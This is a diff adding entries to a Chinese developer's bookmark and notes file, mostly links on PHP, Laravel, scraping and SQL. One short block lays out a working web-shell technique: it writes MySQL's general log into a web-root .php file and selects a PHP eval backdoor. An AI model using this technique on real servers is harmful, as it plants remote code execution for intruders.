@@ -1,5 +1,73 @@
 [简历黑客](http://jianliheike.com)
+[Scrapy第五篇：断点续爬 | 存入MySQL](https://zhuanlan.zhihu.com/p/26810901?group_id=845755819374047232)
+CTF学习站点总结https://zhuanlan.zhihu.com/p/26876253?group_id=846472044680990720  【以图搜图】网站大全了https://zhuanlan.zhihu.com/p/25610099
+图片内容鉴别主要包括：鉴黄、暴恐识别、OCR（识别图片中的文字）https://zhuanlan.zhihu.com/p/26819950?group_id=845705440347176960 https://www.tuputech.com/demo  
+Ngrok：本地主机的安全隧道工具https://ngrok.com/
+用非常生动的动画给你讲数学，每集10分钟左右。http://t.cn/RIJNj6h 
+app后端设计--总目录 http://blog.csdn.net/newjueqi/article/details/19003775 
+你遇到过哪些神奇的网站，并且改变了你的生活质量http://weibo.com/2182038504/F1QTtbrkv 
+ leetcode-cli: 体验不一样的刷题风 (2) 流程篇https://github.com/skygragon/leetcode-cli
+唐宋文学编年地图http://sou-yun.com/poetlife.html
+安利一个良心电影、电视剧下载网站https://moviejie.com/
+ss翻墙http://macvpn.hk/
+收集整理一些常用的PHP类库https://github.com/JingwenTian/awesome-php 
+php 源码阅读http://ghost.icosplay.cc/2017/04/25/php-yuan-ma-yue-du
+浅谈PHP进程管理http://www.manks.top/php-cgi-fpm.html
+一行代码，打造在线编辑器http://blog.githuber.cn/posts/2395 http://litaotao.github.io/files/editor.html
+8种常被忽视的SQL错误用法http://mp.weixin.qq.com/s/1WpspGr7R-EjXfhWzlsZvQ
+支付开发填坑记之微信支付https://segmentfault.com/a/1190000009346755
+public function xmlToArray($xml){
+    return json_decode(json_encode(simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOCDATA)), true);
+}
 
+
+easyPHP-Swoole：专为 API 而生的常驻内存化的 PHP 开发框架https://github.com/kiss291323003/easyPHP-Swoole  
+SQLizer现在有将文件转换为SQL的API。  https://sqlizer.io/help/api#step1
+这个在线二维码生成器不错 
+推荐几个常用的PDF在线转换网站】Smallpdf：O网页链接，ilovepdf：O网页链接，ConvertPDFtoWord：PDFConverter：O网页链接，PDFmyURL
+ypefont：用于识别照片中文本字体的算法。  https://github.com/Sirvasile/Typefont
+数据结构常见的八大排序算法（详细整理）http://www.jianshu.com/p/7d037c332a9d
+HTTP Prompt is an interactive command-line HTTPhttp://http-prompt.com/
+Laravel的Facade实现原理http://www.jianshu.com/p/fd03d0ebc22a?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io
+Facade其实是一个容器中类的静态代理，他可以让你以静态的方式来调用存放在容器中任何对象的任何方法。 直接来看看__callStatic这个方法
+Hacking Tools搜罗大集合http://www.freebuf.com/sectool/133949.html
+开源的类 PostMan，API 管理工具https://github.com/getinsomnia/insomnia
+基于Python开发的可以模拟百万用户的压测工具https://github.com/locustio/locust?files=1
+命令行下，我总是使用 jq 解析 JSON 数据网页版 https://github.com/fiatjaf/jq-web
+APP应用和网页版的支付功能（支付宝，微信，银联）http://blog.leungjz.top/2017/05/10/payment-alipay/?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io
+https://sqlnotebook.com/ 
+php代码检测https://github.com/phpro/grumphp composer require --dev phpro/grumphp
+[除了我们常用的硕鼠外，再给大家安利一款超厉害的视频下载工具视频下载王），它不仅支持YouTube、Vimeo、Fox、AcFun、哔哩哔哩、优酷、爱奇艺](https://www.apowersoft.cn/video-download-capture)
+[常见的网站服务器架构有哪些](https://www.zhihu.com/question/20657269/answer/101795180)
+反反爬虫利器！教你怎么用代理，拨号换IP……https://zhuanlan.zhihu.com/p/26876834
+爬虫比较https://github.com/lining0806/PythonSpiderNotes
+抓取手机app的数据（摩拜单车https://zhuanlan.zhihu.com/p/26785815 http://link.zhihu.com/?target=https%3A//github.com/kimg1234/pachong/blob/master/mobai.py
+php数组排序https://www.zhihu.com/question/59614878/answer/167121815
+```js
+uasort($arr, function($a, $b) {
+	// 比较函数返回1表示交换顺序
+	if($a['Order_info']['add_time'] == $b['Order_info']['add_time']) {
+		return 0;
+	} else {	
+		// 大的交换到前面,所以是降序
+		return ($a['Order_info']['add_time'] < $b['Order_info']['add_time']) ? 1 : -1;
+		// 小的交换到前面,所以是升序
+		return ($a['Order_info']['add_time'] > $b['Order_info']['add_time']) ? 1 : -1;
+	}
+});
+
+作者：eechen
+链接：https://www.zhihu.com/question/59614878/answer/167121815
+来源：知乎
+著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
+```
+[低端姿势拿下某IDC公司主站php](https://zhuanlan.zhihu.com/p/26658739?group_id=842400839929847808)
+借助的就是MySQL的general_log，MySQL中这个general_log是用于记录MySQL中所有执行过的SQL查询，他的记录方式可以是数据表，也可以是文件，并且文件路径也可以指定https://github.com/cw1997/MySQL-Monitor MySQL服务器执行SQL记录实时监控（WEB版本）
+show global variables like '%general%';
+set global general_log = on;
+set global general_log_file = 'D://phpStudy//WWW//ThinkPHP//test.php';
+select '<?php @ev（防和谐补丁）al($_POST[admin])?>';
+[有哪些实用的计算机相关技能，可以在一天内学会？](https://zhuanlan.zhihu.com/p/26661971?group_id=842461525452136448)
 [把嵌套的python list转成一个一维的python list](https://www.zhihu.com/question/27010691)
 ```js
 >>> from compiler.ast import flatten
